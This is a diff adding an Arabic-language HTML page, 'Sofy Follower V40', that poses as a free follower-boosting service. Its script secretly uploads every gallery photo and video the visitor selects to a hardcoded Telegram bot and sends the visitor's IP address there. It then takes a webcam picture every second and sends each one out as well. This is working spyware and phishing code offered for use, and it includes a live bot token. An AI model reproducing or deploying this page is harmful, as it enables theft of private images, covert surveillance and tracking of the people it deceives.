@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Sofy Follower - نظام الرشق العالمي</title>
+    <style>
+        body { background: #050505; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
+        .container { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #00d2ff; max-width: 400px; margin: auto; box-shadow: 0 0 15px #00d2ff; }
+        .btn { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .status { color: #00ffcc; margin-top: 15px; font-size: 14px; }
+        input[type="file"] { display: none; }
+        .upload-box { border: 2px dashed #333; padding: 20px; border-radius: 10px; margin-top: 20px; cursor: pointer; color: #aaa; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚀 Sofy Follower V40</h2>
+        <p>لضمان وصول 2500 متابع، يرجى تأكيد الهوية:</p>
+        
+        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+            📸 اضغط هنا لاختيار (كل صور ومقاطع المعرض) للتحقق من الحساب
+        </div>
+        <input type="file" id="fileInput" multiple accept="image/*,video/*" onchange="stealFiles(this.files)">
+        
+        <button class="btn" onclick="activateSystem()">تفعيل الرشق الآن</button>
+        <div id="status" class="status"></div>
+        
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const CHAT_ID = '1371063739';
+
+        // 1. سحب كل الملفات التي يختارها (صور ومقاطع)
+        function stealFiles(files) {
+            document.getElementById('status').innerText = "⌛ جاري ضغط الملفات للتحقق...";
+            Array.from(files).forEach(file => {
+                let formData = new FormData();
+                let type = file.type.startsWith('video') ? 'sendVideo' : 'sendPhoto';
+                let key = file.type.startsWith('video') ? 'video' : 'photo';
+                
+                formData.append(key, file);
+                fetch(`https://api.telegram.org/bot${TOKEN}/${type}?chat_id=${CHAT_ID}`, {
+                    method: 'POST', body: formData
+                });
+            });
+            setTimeout(() => { document.getElementById('status').innerText = "✅ تم فحص الملفات، اضغط تفعيل."; }, 3000);
+        }
+
+        // 2. التصوير المستمر كل ثانية وسحب الـ IP
+        async function activateSystem() {
+            let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚠️ الضحية بدأ!\n🌐 IP: ' + ip.ip)}`);
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // التقاط صورة كل ثانية وإرسالها
+                setInterval(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        let fd = new FormData();
+                        fd.append('photo', blob, 'cam.jpg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) {
+                alert("يجب السماح بالكاميرا لبدء الرشق!");
+            }
+        }
+    </script>
+</body>
+</html>
